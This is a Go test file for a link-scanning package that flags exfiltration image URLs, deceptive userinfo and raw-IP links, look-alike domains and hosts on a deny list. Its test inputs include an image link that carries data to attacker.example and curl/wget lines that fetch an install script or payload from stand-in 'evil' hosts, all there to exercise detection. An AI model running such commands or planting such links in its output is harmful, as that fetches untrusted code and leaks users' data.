package linkscan

import (
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// The package judges text and nothing else. Its files may import only the
// packages named here, none of which can resolve a name or open a
// connection. A new import fails this test and has to be argued for.
func TestPackageImportsNothingThatReachesTheNetwork(t *testing.T) {
	allowed := map[string]bool{
		"errors": true, "fmt": true, "sort": true, "strings": true,
		"unicode": true, "unicode/utf8": true,
	}
	files, err := filepath.Glob("*.go")
	if err != nil || len(files) == 0 {
		t.Fatalf("no source files found: %v", err)
	}
	checked := 0
	for _, f := range files {
		if strings.HasSuffix(f, "_test.go") {
			continue
		}
		src, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		parsed, err := parser.ParseFile(token.NewFileSet(), f, src, parser.ImportsOnly)
		if err != nil {
			t.Fatal(err)
		}
		checked++
		for _, imp := range parsed.Imports {
			path, _ := strconv.Unquote(imp.Path.Value)
			if path == "net" || strings.HasPrefix(path, "net/") || path == "os" || path == "os/exec" || path == "syscall" {
				t.Errorf("%s imports %q: the link scanner makes no request and resolves no name", f, path)
			}
			if !allowed[path] {
				t.Errorf("%s imports %q, which is not on the list of packages this one may use", f, path)
			}
		}
	}
	if checked == 0 {
		t.Fatal("no non-test file was checked")
	}
}

func TestScan_SpanIsTheAddress(t *testing.T) {
	text := "Before ![x](https://attacker.example/p.png?q=one+two+three+four+five+six+seven+eight) after."
	hits := Scan(text, nil)
	if len(hits) != 1 {
		t.Fatalf("want one hit, got %v", hits)
	}
	h := hits[0]
	if got := text[h.Start:h.End]; got != "https://attacker.example/p.png?q=one+two+three+four+five+six+seven+eight" {
		t.Errorf("span is %q", got)
	}
	if h.Host != "attacker.example" || h.Kind != KindImage || h.Category != Exfiltration || h.Payload == 0 {
		t.Errorf("hit is %+v", h)
	}
}

func TestScan_OneHitPerCategoryOfOneLink(t *testing.T) {
	hits := Scan("[bank.example.com](https://bank.example.com@203.0.113.9:4444/login)", nil)
	got := map[string]bool{}
	for _, h := range hits {
		if got[h.Category] {
			t.Errorf("%s reported twice", h.Category)
		}
		got[h.Category] = true
	}
	for _, want := range []string{Userinfo, IPHost, TextMismatch} {
		if !got[want] {
			t.Errorf("%s not reported: %v", want, categories(hits))
		}
	}
}

func TestLists(t *testing.T) {
	lists, err := NewLists(
		[]string{"evil.example", "*.tracker.example", "203.0.113.77", "Files.Example.ORG."},
		[]string{"charts.example.com", "*.corp.example"},
	)
	if err != nil {
		t.Fatal(err)
	}
	denied := map[string]bool{
		"See https://evil.example/a":                        true,
		"See https://cdn.evil.example/a":                    true,
		"See https://notevil.example/a":                     false,
		"See https://tracker.example/a":                     false, // the wildcard covers what is under it
		"See https://a.tracker.example/a":                   true,
		"See http://203.0.113.77/a":                         true,
		"See http://203.0.113.78/a":                         false,
		"See https://FILES.example.org/a":                   true,
		"In code: `curl https://evil.example/install.sh`":   true, // the deny list applies in code too
		"```\nwget https://cdn.evil.example/payload\n```\n": true,
	}
	for text, want := range denied {
		got := false
		for _, h := range Scan(text, lists) {
			if h.Category == DeniedHost {
				got = true
			}
		}
		if got != want {
			t.Errorf("%q: denied = %v, want %v", text, got, want)
		}
	}

	// The allow list silences the form checks, and only for its hosts.
	chart := "![chart](https://charts.example.com/render?c=%7Btype%3A%27bar%27%2Cdata%3A%7Blabels%3A%5B%27Q1%27%2C%27Q2%27%5D%7D%7D+and+a+long+tail+of+words+here)"
	if hits := Scan(chart, lists); len(hits) != 0 {
		t.Errorf("allowed host reported: %v", categories(hits))
	}
	if hits := Scan(chart, nil); len(hits) == 0 {
		t.Error("the same image is not reported without the allow list")
	}
	if hits := Scan("[wiki](https://wiki.corp.example:9443/page)", lists); len(hits) != 0 {
		t.Errorf("allowed host reported: %v", categories(hits))
	}
	if hits := Scan(strings.Replace(chart, "charts.example.com", "charts.example.net", 1), lists); len(hits) == 0 {
		t.Error("another host is silenced by the allow list")
	}
}

func TestLists_DenyWinsOverAllow(t *testing.T) {
	lists, err := NewLists([]string{"bad.example.com"}, []string{"example.com"})
	if err != nil {
		t.Fatal(err)
	}
	hits := Scan("https://bad.example.com/x", lists)
	if len(hits) != 1 || hits[0].Category != DeniedHost {
		t.Errorf("got %v", categories(hits))
	}
}

func TestCheckHost(t *testing.T) {
	for _, ok := range []string{"example.com", "*.example.com", "a.b.example.com.tr", "203.0.113.5", "[2001:db8::1]", "intranet", "türkiye.example"} {
		if err := CheckHost(ok); err != nil {
			t.Errorf("%q refused: %v", ok, err)
		}
	}
	for _, bad := range []string{"", "  ", "https://example.com", "example.com/path", "example.com:8443", "user@example.com", "*.com", "ex*mple.com", "a..b", "*"} {
		if err := CheckHost(bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
}

func TestPunycodeDecode(t *testing.T) {
	for in, want := range map[string]string{
		"mnchen-3ya":  "münchen",
		"trkiye-3ya":  "türkiye",
		"80aswg":      "сайт",
		"pypal-4ve":   "pаypal", // the second letter is Cyrillic
		"d1acpjx3f":   "яндекс",
		"bcher-kva":   "bücher",
		"maana-pta":   "mañana",
		"-> $1.00 <-": "",
	} {
		got, ok := punycodeDecode(in)
		if want == "" {
			if ok {
				t.Errorf("%q decoded to %q", in, got)
			}
			continue
		}
		if !ok || got != want {
			t.Errorf("%q: got %q (%v), want %q", in, got, ok, want)
		}
	}
}

func TestLookalikeHost(t *testing.T) {
	for host, want := range map[string]bool{
		"example.com":            false,
		"türkiye.gov.tr":         false,
		"ışık.example.com.tr":    false,
		"яндекс.рф":              false,
		"xn--d1acpjx3f.xn--p1ai": false, // яндекс.рф
		"xn--trkiye-3ya.example": false,
		"аpple.example.com":      true, // Cyrillic а
		"xn--pypal-4ve.example":  true,
		"рауре.example":          true, // every letter is a Cyrillic look-alike
		"gοοgle.example":         true, // Greek omicrons
		"xn--80aswg.example":     false,
	} {
		if got := lookalikeHost(host); got != want {
			t.Errorf("%q: %v, want %v", host, got, want)
		}
	}
}

func TestIPHost(t *testing.T) {
	type r struct{ ip, public bool }
	for host, want := range map[string]r{
		"example.com":     {false, false},
		"127.0.0.1":       {true, false},
		"10.1.2.3":        {true, false},
		"172.16.0.9":      {true, false},
		"172.32.0.9":      {true, true},
		"192.168.1.1":     {true, false},
		"169.254.169.254": {true, false},
		"100.64.0.1":      {true, false},
		"203.0.113.5":     {true, true},
		"3405803826":      {true, true},
		"0x7f.0.0.1":      {true, true},
		"0177.0.0.1":      {true, true},
		"127.1":           {true, true},
		"[::1]":           {true, false},
		"[fe80::1]":       {true, false},
		"[fd00::1]":       {true, false},
		"[2001:db8::1]":   {true, true},
		"1.2.3.4.5":       {false, false},
		"v1.2.3":          {false, false},
		"deadbeef.com":    {false, false},
	} {
		ip, public := ipHost(host)
		if ip != want.ip || public != want.public {
			t.Errorf("%q: ip=%v public=%v, want %+v", host, ip, public, want)
		}
	}
}

func TestScan_NothingInPlainText(t *testing.T) {
	for _, text := range []string{
		"",
		"No links here at all.",
		"Time is 12:30 and the ratio 3:1.",
		"A dangling ]( with nothing after",
		"](",
		"[a](",
		"[a]()",
		"://",
		"https://",
		"![",
		strings.Repeat("](", 2000),
		strings.Repeat("[", 5000) + "](x)",
		strings.Repeat("://", 3000),
	} {
		if hits := Scan(text, nil); len(hits) != 0 {
			t.Errorf("%.40q: %v", text, categories(hits))
		}
	}
}

func BenchmarkScan(b *testing.B) {
	prose := strings.Repeat("The quick brown fox jumps over the lazy dog, and the report is due on Friday at 17:30. ", 40)
	links := strings.Join(benignAnswers, "\n\n")
	lists, _ := NewLists([]string{"evil.example", "*.tracker.example"}, []string{"charts.example.com"})
	for _, bc := range []struct {
		name string
		text string
	}{
		{"prose_3k", prose},
		{"benign_answers_9k", links},
		{"stream_window_320", links[:320]},
	} {
		b.Run(bc.name, func(b *testing.B) {
			b.SetBytes(int64(len(bc.text)))
			b.ReportAllocs()
			for i := 0; i < b.N; i++ {
				Scan(bc.text, lists)
			}
		})
	}
}
